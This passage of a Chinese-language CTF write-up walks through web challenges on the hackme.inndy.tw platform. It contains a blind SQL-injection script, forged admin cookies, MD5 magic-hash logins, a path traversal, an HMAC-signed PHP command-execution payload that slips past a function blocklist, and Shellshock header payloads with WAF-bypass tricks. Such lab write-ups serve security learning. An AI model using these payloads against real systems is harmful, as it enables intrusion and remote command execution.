&quot;\\&apos;/**/or/**/(ascii(substr((select/**/SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/limit/**/0,1),%s,1))=%s)/**/limit/**/0,1#&quot;%(i,j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;name&quot;:payload,</span><br><span class="line">            &quot;password&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        print payload</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;You are not admin!&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p><p>跑到怀疑人生还是不跑了</p><h3 id="11-login-as-admin-3"><a href="#11-login-as-admin-3" class="headerlink" title="11.login as admin 3"></a>11.login as admin 3</h3><p><img src="https://i.imgur.com/xCW1UM2.png" alt=""><br>想要爆出flag，cookie中的$user[‘admin’] 要为true<br>从上往下看<br>如果没有cookie的话就继续进行<br><img src="https://i.imgur.com/p969kJx.png" alt=""><br>验证<br>但是如果有cookie的话<br>如果不满足<br><img src="https://i.imgur.com/VZUNTwq.png" alt=""><br>就会报错<br>这了我们要利用，php弱比较，构造sig=0，负负得真绕过限制<br>根据set_users构造cookie形式<br><img src="https://i.imgur.com/T8QjfBR.png" alt=""><br>{“sig”:0,”data”:”[\”admin\”,true]”}<br>进行base64加密，构造payload<br><img src="https://i.imgur.com/1y2N2Hy.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=</span><br></pre></td></tr></table></figure><h3 id="12-login-as-admin-4"><a href="#12-login-as-admin-4" class="headerlink" title="12.login as admin 4"></a>12.login as admin 4</h3><p>看源码，这次得源码很短<br><img src="https://i.imgur.com/vhHtQqL.png" alt=""><br>需要$_POST[‘name’] === ‘admin’<br>看看前面<br><img src="https://i.imgur.com/flDWZWG.png" alt=""><br>如果我们<br>$_POST[‘name’] === ‘admin’<br>就需要$_POST[‘password’] !== $password 不然后面<br>Location: ./?failed=1 就会跳转到failed=1<br><img src="https://i.imgur.com/X8jzhT4.png" alt=""><br>会登入失败<br>但我们并不知道$password 是什么<br>这个应该包含的config.php中<br><img src="https://i.imgur.com/ceXi9hm.png" alt=""><br>那该怎么办呢？<br>我们只要用一个工具使得能够不跳转就直接看到后面的flag<br>这里我们使用curl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &apos;name=damin&apos; https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure></p><h3 id="13-login-as-admin-6"><a href="#13-login-as-admin-6" class="headerlink" title="13.login as admin 6"></a>13.login as admin 6</h3><p>看看源码<br><img src="https://i.imgur.com/xhQIW6V.png" alt=""><br>这里依旧是要满足<br>$user == ‘admin’<br><img src="https://i.imgur.com/pq71E0H.png" alt=""><br>一看到extrat函数<br>立马想能不能使用变量覆盖呢？<br>并且貌似strcmp($users[$username], $password) == 0)<br>里面函数变量是可控的，能不能尝试命令执行呢？<br>首先是变量覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &apos;data=&#123;&quot;user&quot;: &quot;admin&quot;&#125;&apos; https://hackme.inndy.tw/login6/</span><br></pre></td></tr></table></figure></p><p>得到flag<br>其次我们尝试下能不能执行命令<br>构造<br>data = {“username”:”eval(‘echo 1;’);”}试试<br>貌似不可以<br>data = {“username”:”eval(‘phpinfo();’);”}试试<br>貌似不可以<br>本地测试下<br><img src="https://i.imgur.com/ARAmxYX.png" alt=""><br>好吧的确不行<br>必须要<br><img src="https://i.imgur.com/zPM5fKH.png" alt=""><br>这样才可以，记错了</p><h3 id="14-login-as-admin-7"><a href="#14-login-as-admin-7" class="headerlink" title="14.login as admin 7"></a>14.login as admin 7</h3><p>看源码<br><img src="https://i.imgur.com/lQQtPt1.png" alt=""><br>又是需要$user === ‘admin’<br><img src="https://i.imgur.com/w5vRrVH.png" alt=""><br>乍一看感觉有两种写法<br>一种就是md5为0e开头的<br>一种是password[]xxx<br>先试试第一种<br>查下谷歌看下0e开头有哪些，随便找几个</p><blockquote><p>QNKCDZO<br>0e830400451993494058024219903391</p></blockquote><blockquote><p>s878926199a<br>0e545993274517709034328855841020</p></blockquote><blockquote><p>s155964671a<br>0e342768416822451524974117254469</p></blockquote><blockquote><p>s214587387a<br>0e848240448830537924465865611904</p></blockquote><p>貌似一次就成功了<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &quot;name=admin&amp;password=QNKCDZO&quot; https://hackme.inndy.tw/login7/</span><br></pre></td></tr></table></figure></p><p>试试第二种<br>貌似不可以，应该是MD5函数遇到[]直接返回false了</p><h3 id="15-login-as-admin-8"><a href="#15-login-as-admin-8" class="headerlink" title="15.login as admin 8"></a>15.login as admin 8</h3><p>看看源码<br><img src="https://i.imgur.com/Eo1WbAl.png" alt=""><br>貌似要满足<br>$_POST[‘name’] ！== ‘admin’<br>并且$session-&gt;is_admin<br>从上往下看<br><img src="https://i.imgur.com/CkDdW1h.png" alt=""><br>这边都是调用了Session.php的方法，我们貌似不能看到Session.php的源码这就很难受了<br>暂时没想到要怎么样<br>抓包试试看有没有提示，发现<br><img src="https://i.imgur.com/3EYEggR.png" alt=""><br>把login8cookie中b=0,改成b=1<br>貌似不行，<br>login8sha512拿去解密下<br>额，还是不行<br>嗯，我才login8sha512是login8直接sha512加密试试把b=1的也拿加密试试<br>不行的话估计就没办法了<br>额，不行<br>试试直接用url的加密看看<br>还是失败<br>这就很神奇了，按道理是可以的<br>把原先的的cookie 512加密后，额居然是不一样的。。。</p><h3 id="16-login-as-admin-8-1"><a href="#16-login-as-admin-8-1" class="headerlink" title="16.login as admin 8.1"></a>16.login as admin 8.1</h3><p>不想写login as admin.jpg<br>goole了下，发现一个老哥有写,需要的直接看把</p><blockquote><p><a href="https://www.jianshu.com/p/6ef727966153" target="_blank" rel="noopener">https://www.jianshu.com/p/6ef727966153</a></p></blockquote><h3 id="17-dafuq-manager-1"><a href="#17-dafuq-manager-1" class="headerlink" title="17.    dafuq-manager 1"></a>17.    dafuq-manager 1</h3><p>不想写 Login as guest.png<br>算了还是写吧<br><img src="https://i.imgur.com/fUjyh1I.png" alt=""><br>提示使用 guest guest登入<br><img src="https://i.imgur.com/5HqO3M9.png" alt=""><br>Do you know cookie? Create a cookie named <code>help</code> with value <code>me</code>!<br><img src="https://i.imgur.com/RNDy0hC.png" alt=""></p><p>很可疑阿，改成yes<br>得到flag</p><h3 id="18-dafuq-manager-2"><a href="#18-dafuq-manager-2" class="headerlink" title="18.    dafuq-manager 2"></a>18.    dafuq-manager 2</h3><p>这题叫我们用admin进入<br>先 guest guest进入<br><img src="https://i.imgur.com/lcOzYLt.png" alt=""><br>下载源码<br>先看看index.php<br>发现<br><img src="https://i.imgur.com/RSb92f2.png" alt=""><br>继续跟进<br><img src="https://i.imgur.com/BADXyTr.png" alt=""><br>admin需要满足<br><img src="https://i.imgur.com/YJr2kYV.png" alt=""><br>搜下<br><img src="https://i.imgur.com/HumhOH8.png" alt=""><br>发现$GLOBALS[“permissions”]来自func_user<br>而data[6]又来自$data<br>$data又与find_user有关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function &amp;find_user($user, $pass) &#123;</span><br><span class="line">    $cnt = count($GLOBALS[&quot;users&quot;]);</span><br><span class="line">    for ($i = 0;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        if ($user == $GLOBALS[&quot;users&quot;][$i][0]) &#123;</span><br><span class="line">            if ($pass == NULL || ($pass == $GLOBALS[&quot;users&quot;][$i][1] &amp;&amp; $GLOBALS[&quot;users&quot;][$i][7])) &#123;</span><br><span class="line">                return $GLOBALS[&quot;users&quot;][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即为$GLOBALS[“users”][6];<br>和/.config/.htusers.php有关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$GLOBALS[&quot;users&quot;] = array(</span><br><span class="line">    array(&quot;guest&quot;, &quot;084e0343a0486ff05530df6c705c8bb4&quot;, &quot;./data/guest&quot;, &quot;https://game1.security.ntu.st/data/guest&quot;, 0, &quot;^.ht&quot;, 1, 1),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>有关,但是源码泄露并没有泄露全只给出了guest的密码，这里应该是有管理员账号密码的，账号密码存在文件中所以我们不能够sql注入<br>看看有没有什么文件读取的/.config/.htusers.php的<br>读取文件函数</p><blockquote><p>fread<br>file_get_contents<br>fopen<br>file_arr<br>fgets<br>include<br>require<br>readfile</p></blockquote><p>在seay中进行自动审计<br><img src="https://i.imgur.com/PZ1K584.png" alt=""><br>fun_down有readfile<br>![](<a href="https://i.imgur.com/bAS6S9G.png" target="_blank" rel="noopener">https://i.imgur.com/bAS6S9G.png</a><br>但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!file_in_web($abs_item) || stristr($abs_item, &apos;.php&apos;) || stristr($abs_item, &apos;config&apos;)) show_error($item . &quot;: &quot; . $GLOBALS[&quot;error_msg&quot;][&quot;accessfile&quot;]);</span><br></pre></td></tr></table></figure></p><p>过滤的是否严密，把config，php都过滤了，看看还有没有什么地方可以读取的<br>我们看看第六条/core/fun_edit.php<br><img src="https://i.imgur.com/eAWnZwB.png" alt=""><br>前面两个条件第一个我们在<br>.htusers.php中可以看出这项是对的<br>第二个条件是也是符合的<br>看看<br><img src="https://i.imgur.com/eF3gL6H.png" alt=""><br>只有一个简单的过滤我们随便就可以过了<br>所以我们构造目录穿梭进行读取<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=</span><br><span class="line">/../../../../../../var/www/webhdisk/.config/.htusers.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/vkh2zJc.png" alt=""><br>md5解码后登入得到flag</p><h3 id="19-dafuq-manager-3"><a href="#19-dafuq-manager-3" class="headerlink" title="19.dafuq-manager 3"></a>19.dafuq-manager 3</h3><p>还是这题，<br>审计不动.jpg<br>mmp<br>题目叫我们get-shell<br>上题就注意这个eval了<br><img src="https://i.imgur.com/5Bre5Xj.png" alt=""><br>这题看下可不可以利用<br><img src="https://i.imgur.com/buLS911.png" alt=""><br>很明显要通过这个hash_equals的判断<br>耿总下cmd以及hmac看看<br>发现是源于<img src="https://i.imgur.com/hyOwRmW.png" alt=""><br>我们可以控制cmd以及hmac的值<br>但是必须满足<br>hash_hmac(‘sha256’, $cmd, $GLOBALS[“secret_key”]）<br>也就是说我们还需要知道 $GLOBALS[“secret_key”]是怎么来的<br>在/.config/conf.php文件中我们获取到了<br>$GLOBALS[“secret_key”] = ‘KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3’;<br>$GLOBALS[“secret_key”]的值<br>也就是说我们已经可以构造cmd命令进行命令执行了<br>但是<br><img src="https://i.imgur.com/dMWZdPy.png" alt=""><br><img src="https://i.imgur.com/UGmTBKE.png" alt=""><br>直接dir[]绕过<br>这里显示对cmd进行base64解码，然后进行waf过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;system&apos;, &apos;exec&apos;, &apos;popen&apos;, </span><br><span class="line">&apos;pcntl_exec&apos;, &apos;proc_open&apos;, </span><br><span class="line">&apos;passthru&apos;, &apos;`&apos;, &apos;eval&apos;, </span><br><span class="line">&apos;assert&apos;, &apos;preg_replace&apos;, </span><br><span class="line">&apos;create_function&apos;, &apos;include&apos;,</span><br><span class="line">&apos;require&apos;, &apos;curl&apos;</span><br></pre></td></tr></table></figure></p><p>可以使用拼接的方法进行绕过<br>具体看</p><blockquote><p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p></blockquote><p>先echo 1；下看下行不行<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cmd=&apos;$a=\&apos;ass\&apos;;$b=\&apos;ert\&apos;;$c=$a.$b;$c(base64_decode(\&apos;c3lzdGVtKCdscycp\&apos;));&apos;;</span><br><span class="line">$hash=&apos;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3&apos;;</span><br><span class="line">$hmac=hash_hmac(&apos;sha256&apos;, $cmd, $hash);</span><br><span class="line">echo sprintf(&apos;%s.%s&apos;, base64_encode($cmd), $hmac</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/SJTpKbU.png" alt=""><br>啥意思<br>嗯，可能要读取下flag3?<br>cat flag3<br>啥都没有<br>执行下<br>./flag3<br>没反应<br>这可能是个文件夹<br>cd flag3; ls试试<br><img src="https://i.imgur.com/DtuLg7P.png" alt=""><br>再执行下<br>./flag3/flag3<br>没反应<br>看到meow 这个应该是个编译好的c文件<br>执行下<br>./flag3/meow flag We have cat to read file, And the meow to cat flag.<br>应该是两个都要执行<br>system(‘./flag3/meow ./flag3/flag3’)<br>flag出来了</p><h3 id="20-wordpress-1"><a href="#20-wordpress-1" class="headerlink" title="20.wordpress 1"></a>20.wordpress 1</h3><p>看了下提示<br>Something strange is hidding in the source code<br>这大概是用 wordpress搭建的博客，我自己使用的是hexo<br>看看源码，没有什么特殊发现，看看有没有源码泄露<br>打开robots.txt没有<br>看看博客文章<br>在第一篇文章里发现源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.dropbox.com/s/r5fk52thwh79kzw/web-security-course-game2.7z?dl=0</span><br></pre></td></tr></table></figure></p><p>把源码下载下来</p><blockquote><p><a href="https://www.dropbox.com/h" target="_blank" rel="noopener">https://www.dropbox.com/h</a></p></blockquote><p>这个网站貌似挺好的，不过存储只有2G，太少了<br>自动审计+搜索下flag，发现一大堆…<br>mmp这可能要审成sb了<br>一般来说这种完整的网站，插件是一个漏洞很可能存在的地方<br><img src="https://i.imgur.com/LOGowLr.png" alt=""><br><img src="https://i.imgur.com/fbb5tmJ.png" alt=""><br>这一串sprintf是什么鬼<br>哦<br><img src="https://i.imgur.com/LbPiMsm.png" alt=""><br>试试看password[]能不能绕过<br>不能<br>只能拿去破解了<br><img src="https://i.imgur.com/FdhOBvM.png" alt=""></p><blockquote><p>吐槽下cMD5还是什么都要收费（）我刚刚使用的md5解密的平台chamd5</p></blockquote><p><img src="https://i.imgur.com/OX5JV0I.png" alt=""><br>跟进<br><img src="https://i.imgur.com/UD2y2yU.png" alt=""><br>直接x-forword-for 127.0.0.1<br>出来了</p><h3 id="21-wordpress-1"><a href="#21-wordpress-1" class="headerlink" title="21.wordpress 1"></a>21.wordpress 1</h3><p><img src="https://i.imgur.com/8zSWBBR.png" alt=""></p><p>上一题就注意到了<br><img src="https://i.imgur.com/Y83jQAl.png" alt=""><br>难道是第一题的flag输入进去吗？<br>好吧想多了，可能是要通过某个后门进入<br>在源码处发现，别问我怎么找到问就648<br><img src="https://i.imgur.com/4e4LZAa.png" alt=""><br>大概意思是通过post某个值获取这个值的内容？<br>嗯，文件时Seach，这大概也要search下吧</p><blockquote><p>view-source:<a href="https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title" target="_blank" rel="noopener">https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title</a></p></blockquote><p><img src="https://i.imgur.com/7GbcWoX.png" alt=""><br>于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&amp;debug=content</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="22-webshell"><a href="#22-webshell" class="headerlink" title="22 .webshell"></a>22 .webshell</h3><p>一进去502</p><blockquote><p>a padding to disable MSIE and Chrome friendly error page</p></blockquote><p>换下火狐试试<br>怎么肥事，还是不行<br>只能跳过这题了</p><h3 id="23-command-executor"><a href="#23-command-executor" class="headerlink" title="23.command-executor"></a>23.command-executor</h3><p>这题有点叼<br>跟着大佬的wp做做吧<br>进入<br>随意点点，在List files发现func与下面的php文件名字相同<br>疑似有文件包含漏洞，使用php伪协议看看能不能读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p><p>得到index源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pages = [</span><br><span class="line">    [&apos;man&apos;, &apos;Man&apos;],</span><br><span class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</span><br><span class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</span><br><span class="line">    [&apos;ls&apos;, &apos;List files&apos;],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function fuck($msg) &#123;</span><br><span class="line">    header(&apos;Content-Type: text/plain&apos;);</span><br><span class="line">    echo $msg;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function waf($a) &#123;</span><br><span class="line">    global $black_list;</span><br><span class="line">    if(is_array($a)) &#123;</span><br><span class="line">        foreach($a as $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        foreach($black_list as $b) &#123;</span><br><span class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</span><br><span class="line">                fuck(&quot;$b detected! exit now.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</span><br><span class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</span><br><span class="line">        putenv(&quot;$key=$val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;func&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;func&apos;];</span><br><span class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</span><br><span class="line">        $page = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        include(&quot;$page.php&quot;);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function render_default() &#123; ?&gt;</span><br><span class="line">&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;</span><br><span class="line">&lt;?php &#125;</span><br><span class="line">?&gt;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Command Executor&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      nav &#123; margin-bottom: 1rem; &#125;</span><br><span class="line">      img &#123; max-width: 100%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">&lt;?php foreach($pages as list($file, $title)): ?&gt;</span><br><span class="line">        &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">&lt;?php endforeach; ?&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&apos;render&apos;)) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>发现可疑函数putenv<br>这里与14年的破壳漏洞有关</p><blockquote><p>●发布时间:2014-09-25　14时48分04秒<br>●CVE ID:CVE-2014-6271<br>●受影响版本:</p></blockquote><p>具体可以看</p><blockquote><p><a href="https://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/45390.html</a></p></blockquote><p>google<br>可以发现</p><blockquote><p><a href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p></blockquote><p><img src="https://i.imgur.com/EcXUBAG.png" alt=""></p><p>和我们所要利用的几乎一样<br><img src="https://i.imgur.com/T5uAmTs.png" alt=""><br>尝试使用payload</p><blockquote><p>wget –header=”X-Exploit: () { :; }; echo Hacked” -q -O -  <a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env</a></p></blockquote><p>发现被过滤</p><p><img src="https://i.imgur.com/6M5yDFA.png" alt=""><br>查看源码</p><p><img src="https://i.imgur.com/pkPYbsE.png" alt=""><br>waf是由正则进行匹配，这种waf非常不安全<br>只要将：；中间加个空格就可以绕过<br>payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo Hacked&quot; -q -O -  https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env|grep Hacked</span><br></pre></td></tr></table></figure></p><p>得到回显<br>通过之前目录穿梭<br>../../../<br>可以发现flag<br><img src="https://i.imgur.com/g99DGuY.png" alt=""><br>也就是说我们要读取这个flag<br>发现我们被waf过滤了<br><img src="https://i.imgur.com/qKmQXts.png" alt=""><br>这里有两种方式绕过</p><blockquote><p>1.拼接方式<br>2.通配符</p></blockquote><blockquote><p>wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag” -q -O - “<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</a></p></blockquote><p>使用通配符进行代替f字母，我们成功绕过waf<br>但是flag文件需要root权限才能进行读取，<br>而flag下面flag-reader这个c文件很可疑<br>我们进行读取</p><blockquote><p>wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c” -q -O - “<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char buff[4096], rnd[16], val[16];</span><br><span class="line">    if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123;</span><br><span class="line">        write(1, &quot;Not enough random\n&quot;, 18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setuid(1337);</span><br><span class="line">    seteuid(1337);</span><br><span class="line">    alarm(1);</span><br><span class="line">    write(1, &amp;rnd, sizeof(rnd));</span><br><span class="line">    read(0, &amp;val, sizeof(val));</span><br><span class="line"></span><br><span class="line">    if(memcmp(rnd, val, 